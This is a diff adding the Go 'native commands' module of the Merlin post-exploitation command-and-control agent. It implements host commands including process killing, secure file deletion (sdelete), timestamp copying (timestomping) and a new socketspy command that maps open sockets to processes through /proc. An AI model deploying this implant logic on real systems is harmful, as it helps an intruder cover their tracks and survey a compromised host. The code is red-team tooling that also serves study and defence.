@@ -1,0 +1,581 @@
+/*
+Merlin is a post-exploitation command and control framework.
+
+This file is part of Merlin.
+Copyright (C) 2024 Russel Van Tuyl
+
+Merlin is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+any later version.
+
+Merlin is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
+*/
+
+package commands
+
+import (
+	// Standard
+	"bufio"
+	"bytes"
+	"fmt"
+	"math"
+	"net"
+	"os"
+	"path/filepath"
+	"strconv"
+	"strings"
+	"time"
+	"unsafe"
+
+	// Merlin Main
+	"github.com/Ne0nd0g/merlin-message/jobs"
+
+	// Internal
+	"github.com/Ne0nd0g/merlin-agent/v2/cli"
+)
+
+// Native executes a golang native command that does not use any executables on the host
+func Native(cmd jobs.Command) jobs.Results {
+	cli.Message(cli.DEBUG, fmt.Sprintf("Entering into commands.Native() with %+v...", cmd))
+	var results jobs.Results
+
+	cli.Message(cli.NOTE, fmt.Sprintf("Executing native command: %s", cmd.Command))
+
+	switch cmd.Command {
+	// TODO create a function for each Native Command that returns a string and error and DOES NOT use (a *Agent)
+
+	case "cd":
+		// Setup OS environment, if any
+		err := Setup()
+		if err != nil {
+			results.Stderr = err.Error()
+			break
+		}
+		// Defer TearDown and return any errors
+		defer func() {
+			err = TearDown()
+			if err != nil {
+				results.Stderr += fmt.Sprintf("there was an error tearing down the OS environment when executing the 'cd' command: %s", err)
+			}
+		}()
+		err = os.Chdir(cmd.Args[0])
+		if err != nil {
+			results.Stderr = fmt.Sprintf("there was an error changing directories when executing the 'cd' command:\r\n%s", err.Error())
+		} else {
+			path, pathErr := os.Getwd()
+			if pathErr != nil {
+				results.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'cd' command:\r\n%s", pathErr.Error())
+			} else {
+				results.Stdout = fmt.Sprintf("Changed working directory to %s", path)
+			}
+		}
+	case "env":
+		results.Stdout, results.Stderr = env(cmd.Args)
+	case "ls":
+		listing, err := list(cmd.Args[0])
+		if err != nil {
+			results.Stderr = fmt.Sprintf("there was an error executing the 'ls' command:\r\n%s", err.Error())
+			break
+		}
+		results.Stdout = listing
+	case "ifconfig":
+		ifaces, err := ifconfig()
+		if err != nil {
+			results.Stderr = fmt.Sprintf("there was an error executing the 'ifconfig' command:\n%s", err)
+		}
+		results.Stdout = ifaces
+	case "killprocess":
+		results.Stdout, results.Stderr = killProcess(cmd.Args[0])
+	case "nslookup":
+		results.Stdout, results.Stderr = nslookup(cmd.Args)
+	case "pwd":
+		dir, err := os.Getwd()
+		if err != nil {
+			results.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'pwd' command:\r\n%s", err.Error())
+		} else {
+			results.Stdout = fmt.Sprintf("Current working directory: %s", dir)
+		}
+	case "rm":
+		if len(cmd.Args) > 0 {
+			results.Stdout, results.Stderr = rm(cmd.Args[0])
+		} else {
+			results.Stderr = "not enough arguments provided to the 'rm' command"
+		}
+	case "sdelete":
+		if len(cmd.Args) > 0 {
+			results.Stdout, results.Stderr = sdelete(cmd.Args[0])
+		} else {
+			results.Stderr = "the sdelete command requires one argument but received 0"
+		}
+	case "touch":
+		if len(cmd.Args) > 1 {
+			results.Stdout, results.Stderr = touch(cmd.Args[0], cmd.Args[1])
+		} else {
+			results.Stderr = fmt.Sprintf("the touch command requires two arguments but received %d", len(cmd.Args))
+		}
+	case "socketspy":
+		if len(cmd.Args) < 1 {
+			results.Stderr = "socketspy requires timeout argument, e.g. socketspy 30"
+			break
+		}
+
+		timeoutSec, err := strconv.Atoi(cmd.Args[0])
+		if err != nil {
+			results.Stderr = fmt.Sprintf("socketspy: invalid timeout: %s", err)
+			break
+		}
+		if timeoutSec <= 0 {
+			timeoutSec = 15 // デフォルト15秒
+		}
+
+		var sb strings.Builder
+		sb.WriteString(fmt.Sprintf("[*] Starting socketspy (timeout: %ds)...\n", timeoutSec))
+
+		deadline := time.Now().Add(time.Duration(timeoutSec) * time.Second)
+
+		for time.Now().Before(deadline) {
+			nowStr := time.Now().Format("2006-01-02 15:04:05")
+
+			// 1. プロセスごとの Socket Inode マップを作成 (PID & CMD 紐付け用)
+			inodeMap := buildSocketInodeMap()
+
+			// 2. TCP / UDP の読み取りと出力フォーマット化
+			var currentConns []ConnEntry
+			if data, err := os.ReadFile("/proc/net/tcp"); err == nil {
+				currentConns = append(currentConns, parseProcNetAdvanced(data, "TCP", inodeMap)...)
+			}
+			if data, err := os.ReadFile("/proc/net/udp"); err == nil {
+				currentConns = append(currentConns, parseProcNetAdvanced(data, "UDP", inodeMap)...)
+			}
+
+			// 新しく現れた（または変化した）コネクションをスマートに出力
+			for _, c := range currentConns {
+				key := fmt.Sprintf("%s <---> %s", c.Local, c.Remote)
+
+				line := fmt.Sprintf("[%s] %s", nowStr, key)
+				if c.PID != "" {
+					line += fmt.Sprintf(" PID:%s CMD:%s", c.PID, c.CMD)
+				}
+
+				sb.WriteString(line + "\n")
+			}
+
+			time.Sleep(1 * time.Second) // 1秒ごとにポーリング
+		}
+
+		sb.WriteString("[*] socketspy finished.")
+		results.Stdout = sb.String()
+	}
+
+	return results
+}
+
+// list gets and returns a list of files and directories from the input file path
+func list(path string) (details string, err error) {
+	cli.Message(cli.DEBUG, fmt.Sprintf("Received input parameter for list command function: %s", path))
+	cli.Message(cli.SUCCESS, fmt.Sprintf("listing directory contents for: %s", path))
+
+	var aPath string
+	// UNC Path
+	if strings.HasPrefix(path, "\\\\") {
+		aPath = path
+	} else {
+		// Resolve a relative path to absolute
+		aPath, err = filepath.Abs(path)
+		if err != nil {
+			return "", err
+		}
+	}
+
+	// Setup OS environment, if any
+	err = Setup()
+	if err != nil {
+		return
+	}
+	// Defer TearDown and return any errors
+	defer func() {
+		err2 := TearDown()
+		if err2 != nil {
+			if err != nil {
+				err = fmt.Errorf("there were multiple errors. 1. %s 2. %s", err, err2)
+			} else {
+				err = err2
+			}
+		}
+	}()
+
+	directories, err := os.ReadDir(aPath)
+	if err != nil {
+		return
+	}
+
+	details += fmt.Sprintf("Directory listing for: %s\r\n\r\n", aPath)
+
+	for _, dir := range directories {
+		var f os.FileInfo
+		f, err = dir.Info()
+		if err != nil {
+			details += fmt.Sprintf("\nthere was an error getting file info for directory '%s'\n", dir)
+			continue
+		}
+		perms := f.Mode().String()
+		size := strconv.FormatInt(f.Size(), 10)
+		modTime := f.ModTime().String()[0:19]
+		name := f.Name()
+		details = details + perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"
+	}
+	return
+}
+
+// nslookup is used to perform a DNS query using the host's configured resolver
+func nslookup(query []string) (string, string) {
+	var resp string
+	var stderr string
+	for _, q := range query {
+		ip := net.ParseIP(q)
+		if ip != nil {
+			r, err := net.LookupAddr(ip.String())
+			if err != nil {
+				stderr += fmt.Sprintf("there was an error calling the net.LookupAddr function for %s:\r\n%s", q, err)
+			}
+			resp += fmt.Sprintf("Query: %s, Result: %s\r\n", q, strings.Join(r, " "))
+		} else {
+			r, err := net.LookupHost(q)
+			if err != nil {
+				stderr += fmt.Sprintf("there was an error calling the net.LookupHost function for %s:\r\n%s", q, err)
+			}
+			resp += fmt.Sprintf("Query: %s, Result: %s\r\n", q, strings.Join(r, " "))
+		}
+	}
+	return resp, stderr
+}
+
+// killProcess is used to kill a running process by its number identifier
+func killProcess(pid string) (stdout string, stderr string) {
+	targetpid, err := strconv.Atoi(pid)
+	if err != nil || targetpid < 0 {
+		stderr = fmt.Sprintf("There was an error converting the pid %s to an integer:\n%s", pid, err)
+		return
+	}
+
+	// Setup OS environment, if any
+	err = Setup()
+	if err != nil {
+		stderr = err.Error()
+		return
+	}
+	// Defer TearDown and return any errors
+	defer func() {
+		err = TearDown()
+		if err != nil {
+			stderr += fmt.Sprintf("there was an error tearing down the OS environment when executing the 'killprocess' command: %s", err)
+		}
+	}()
+
+	proc, err := os.FindProcess(targetpid)
+	if err != nil { // On linux, always returns a process. Don't worry, the Kill() will fail
+		stderr = fmt.Sprintf("Could not find a process with pid %d:\r\n%s", targetpid, err)
+		return
+	}
+
+	err = proc.Kill()
+	if err != nil {
+		stderr = fmt.Sprintf("Error killing pid %d:\r\n%s", targetpid, err)
+		return
+	}
+
+	stdout = fmt.Sprintf("Successfully killed pid %d", targetpid)
+	return
+}
+
+// rm removes, or deletes, a file
+func rm(path string) (stdout, stderr string) {
+	cli.Message(cli.DEBUG, "Entering into native.rm()... function")
+
+	// Setup OS environment, if any
+	err := Setup()
+	if err != nil {
+		stderr = err.Error()
+		return
+	}
+	// Defer TearDown and return any errors
+	defer func() {
+		err = TearDown()
+		if err != nil {
+			stderr += fmt.Sprintf("there was an error tearing down the OS environment when executing the 'rm' command: %s", err)
+		}
+	}()
+
+	// Verify that file exists
+	_, err = os.Stat(path)
+	if err != nil {
+		stderr = fmt.Sprintf("there was an error executing the 'rm' command: %s", err.Error())
+		return
+	}
+
+	err = os.Remove(path)
+	if err != nil {
+		stderr = fmt.Sprintf("there was an error executing the 'rm' command: %s", err.Error())
+	}
+
+	stdout = fmt.Sprintf("successfully removed file %s", path)
+	return
+}
+
+// sdelete securely deletes a file
+func sdelete(targetfile string) (resp string, stderr string) {
+	targetfile = filepath.Clean(targetfile)
+
+	// Setup OS environment, if any
+	err := Setup()
+	if err != nil {
+		stderr = err.Error()
+		return
+	}
+	// Defer TearDown and return any errors
+	defer func() {
+		err = TearDown()
+		if err != nil {
+			stderr += fmt.Sprintf("there was an error tearing down the OS environment when executing the 'sdelete' command: %s", err)
+		}
+	}()
+
+	file, err := os.OpenFile(targetfile, os.O_RDWR, 0666)
+	if err != nil {
+		stderr = fmt.Sprintf("Error opening file: %s\r\n%s", targetfile, err.Error())
+		return resp, stderr
+	}
+
+	fileInfo, err := file.Stat()
+	if err != nil {
+		stderr = fmt.Sprintf("Error determining file size: %s\r\n%s", targetfile, err.Error())
+		file.Close()
+		return resp, stderr
+	}
+
+	var fileSize = fileInfo.Size()
+	const fileChunk = 1 * (1 << 20) // 1MB Chunks
+
+	totalPartsNum := uint64(math.Ceil(float64(fileSize) / float64(fileChunk)))
+	lastPosition := 0
+
+	for i := uint64(0); i < totalPartsNum; i++ {
+		partSize := int(math.Min(fileChunk, float64(fileSize-int64(i*fileChunk))))
+		partZeroBytes := make([]byte, partSize)
+
+		copy(partZeroBytes[:], "0")
+
+		n, err := file.WriteAt(partZeroBytes, int64(lastPosition))
+		if err != nil {
+			stderr = fmt.Sprintf("Error over writing file: %s\r\n%s", targetfile, err.Error())
+			file.Close()
+			return resp, stderr
+		}
+
+		resp += fmt.Sprintf("Wiped %v bytes.\n", n)
+		lastPosition = lastPosition + partSize
+	}
+
+	err = file.Close()
+	if err != nil {
+		stderr = fmt.Sprintf("There was an error closing the %s file:\n%s", targetfile, err)
+		return
+	}
+
+	err = os.Remove(targetfile)
+	if err != nil {
+		stderr = fmt.Sprintf("Error deleting file: %s\r\n%s", targetfile, err.Error())
+		return resp, stderr
+	}
+	resp += fmt.Sprintf("Securely deleted file: %s\n", targetfile)
+
+	return resp, stderr
+}
+
+// touch matches the destination file's timestamps with source file
+func touch(inputsourcefile string, inputdestinationfile string) (resp string, stderr string) {
+	sourcefilename := inputsourcefile
+	destinationfilename := inputdestinationfile
+
+	// Setup OS environment, if any
+	err := Setup()
+	if err != nil {
+		return "", err.Error()
+	}
+	// Defer TearDown and return any errors
+	defer func() {
+		err = TearDown()
+		if err != nil {
+			stderr += fmt.Sprintf("there was an error tearing down the OS environment when executing the 'touch' command: %s", err)
+		}
+	}()
+
+	sourcefile, err1 := os.Stat(sourcefilename)
+	if err1 != nil {
+		stderr = fmt.Sprintf("Error retrieving last modified time of: %s\n%s\n", sourcefilename, err1.Error())
+		return resp, stderr
+	}
+
+	modifiedtime := sourcefile.ModTime()
+
+	err2 := os.Chtimes(destinationfilename, modifiedtime, modifiedtime)
+	if err2 != nil {
+		stderr = fmt.Sprintf("Error changing last modified and accessed time of: %s\n%s\n", destinationfilename, err2.Error())
+		return resp, stderr
+	}
+	resp = fmt.Sprintf("File: %s\nLast modified and accessed time set to: %s\n", destinationfilename, modifiedtime)
+	return resp, stderr
+}
+
+type ConnEntry struct {
+	Local  string
+	Remote string
+	Inode  string
+	PID    string
+	CMD    string
+}
+
+// /proc からソケットinodeとPID/CMDの紐付けマップを作る関数
+func buildSocketInodeMap() map[string]struct{ PID, CMD string } {
+	socketMap := make(map[string]struct{ PID, CMD string })
+
+	procs, err := os.ReadDir("/proc")
+	if err != nil {
+		return socketMap
+	}
+
+	for _, p := range procs {
+		if !p.IsDir() {
+			continue
+		}
+		pid := p.Name()
+		if len(pid) == 0 || pid[0] < '0' || pid[0] > '9' {
+			continue
+		}
+
+		cmdBytes, err := os.ReadFile(fmt.Sprintf("/proc/%s/comm", pid))
+		cmd := ""
+		if err == nil {
+			cmd = strings.TrimSpace(string(cmdBytes))
+		}
+		if cmd == "" {
+			if cmdlineBytes, err := os.ReadFile(fmt.Sprintf("/proc/%s/cmdline", pid)); err == nil && len(cmdlineBytes) > 0 {
+				parts := strings.Split(string(cmdlineBytes), "\x00")
+				if len(parts) > 0 {
+					cmd = parts[0]
+				}
+			}
+		}
+
+		fds, err := os.ReadDir(fmt.Sprintf("/proc/%s/fd", pid))
+		if err != nil {
+			continue
+		}
+
+		for _, fd := range fds {
+			link, err := os.Readlink(fmt.Sprintf("/proc/%s/fd/%s", pid, fd.Name()))
+			if err != nil {
+				continue
+			}
+			if strings.HasPrefix(link, "socket:[") && strings.HasSuffix(link, "]") {
+				inode := link[8 : len(link)-1]
+				socketMap[inode] = struct{ PID, CMD string }{PID: pid, CMD: cmd}
+			}
+		}
+	}
+	return socketMap
+}
+
+// 高度なProcネットパース（inode付き）
+func parseProcNetAdvanced(data []byte, proto string, inodeMap map[string]struct{ PID, CMD string }) []ConnEntry {
+	var entries []ConnEntry
+	scanner := bufio.NewScanner(bytes.NewReader(data))
+
+	isFirst := true
+	for scanner.Scan() {
+		if isFirst {
+			isFirst = false
+			continue
+		}
+
+		fields := strings.Fields(scanner.Text())
+		if len(fields) < 10 {
+			continue
+		}
+
+		localIP, localPort := parseHexAddr(fields[1])
+		remoteIP, remotePort := parseHexAddr(fields[2])
+		inode := fields[9]
+
+		localStr := fmt.Sprintf("%s:%d/%s", localIP, localPort, proto)
+		remoteStr := fmt.Sprintf("%s:%d/%s", remoteIP, remotePort, proto)
+
+		pidStr := ""
+		cmdStr := ""
+		if info, exists := inodeMap[inode]; exists {
+			pidStr = info.PID
+			cmdStr = info.CMD
+		}
+
+		entries = append(entries, ConnEntry{
+			Local:  localStr,
+			Remote: remoteStr,
+			Inode:  inode,
+			PID:    pidStr,
+			CMD:    cmdStr,
+		})
+	}
+	return entries
+}
+
+// 1ファイルだけで全アーキテクチャ（x86 / ARM / MIPS）のバイトオーダーを自動吸収する補助関数
+func parseHexAddr(hexStr string) (string, int) {
+	parts := strings.Split(hexStr, ":")
+	if len(parts) != 2 {
+		return "0.0.0.0", 0
+	}
+
+	ipHex := parts[0]
+	if len(ipHex) != 8 {
+		return "0.0.0.0", 0
+	}
+
+	var ipInt uint64
+	_, _ = fmt.Sscanf(ipHex, "%X", &ipInt)
+
+	var b0, b1, b2, b3 byte
+
+	if isBigEndian() {
+		b0 = byte(ipInt >> 24)
+		b1 = byte(ipInt >> 16)
+		b2 = byte(ipInt >> 8)
+		b3 = byte(ipInt)
+	} else {
+		b0 = byte(ipInt)
+		b1 = byte(ipInt >> 8)
+		b2 = byte(ipInt >> 16)
+		b3 = byte(ipInt >> 24)
+	}
+
+	ip := fmt.Sprintf("%d.%d.%d.%d", b0, b1, b2, b3)
+
+	var portInt int64
+	_, _ = fmt.Sscanf(parts[1], "%X", &portInt)
+
+	return ip, int(portInt)
+}
+
+// 実行中のCPUがBigEndianかどうかを判定するシンプルなヘルパー
+func isBigEndian() bool {
+	var i int32 = 0x01020304
+	u := unsafe.Pointer(&i)
+	pb := (*byte)(u)
+	return *pb == 0x01
+}
